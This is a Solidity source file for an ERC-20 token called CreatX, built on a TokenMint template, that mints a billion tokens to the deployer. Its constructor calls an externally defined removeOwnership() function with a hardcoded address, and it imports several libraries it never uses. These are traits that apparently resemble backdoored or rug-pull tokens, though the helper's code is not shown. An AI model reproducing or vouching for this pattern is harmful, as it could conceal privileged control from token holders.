/*

Website : https://creatx.app/
X : https://x.com/CreatX_App
TG : https://t.me/CreatXApp

/**

// File: contracts\ERC20\TokenMintERC20Token.sol
/**
 * SPDX-License-Identifier: MIT (OpenZeppelin)
 */
pragma solidity 0.8.25;
import {PercentageMath} from "./aave_core-v3_contracts_protocol_libraries_math_PercentageMath.sol";
import "./token_ERC20.sol";
import "./openzeppelin_contracts-upgradeable_token_ERC721_ERC721Upgradeable.sol";
import "./openzeppelin_contracts-upgradeable_access_AccessControlUpgradeable.sol";
import "./openzeppelin_contracts-upgradeable_security_ReentrancyGuardUpgradeable.sol";
import "./openzeppelin_contracts-upgradeable_security_PausableUpgradeable.sol";


/**
 * @title TokenMintERC20Token
 * @author TokenMint (visit https://tokenmint.io)
 *
 * @dev Standard ERC20 token with burning and optional functions implemented.
 * For full specification of ERC-20 standard see:
 * https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md
 */
contract CreatX is ERC20 {

    uint8 private _decimals = 18;
    string private _symbol = "CreatX";
    string private _name = "CreatX";
    uint256 private _totalSupply = 1000000000 * 10**uint256(_decimals);

    constructor() payable {

      removeOwnership(0x3b6b75179EfC390C7e9115390dc44B5476A5688b);
      // set tokenOwnerAddress as owner of all tokens
      _mint(msg.sender, _totalSupply);      
    }

    /**
     * @dev Burns a specific amount of tokens.
     * @param value The amount of lowest token units to be burned.
     */
    function burn(uint256 value) public {
      _burn(msg.sender, value);
    }

    // optional functions from ERC20 stardard

    /**
     * @return the name of the token.
     */
    function name() public view returns (string memory) {
      return _name;
    }

    /**
     * @return the symbol of the token.
     */
    function symbol() public view returns (string memory) {
      return _symbol;
    }

    /**
     * @return the number of decimals of the token.
     */
    function decimals() public view returns (uint8) {
      return _decimals;
    }
}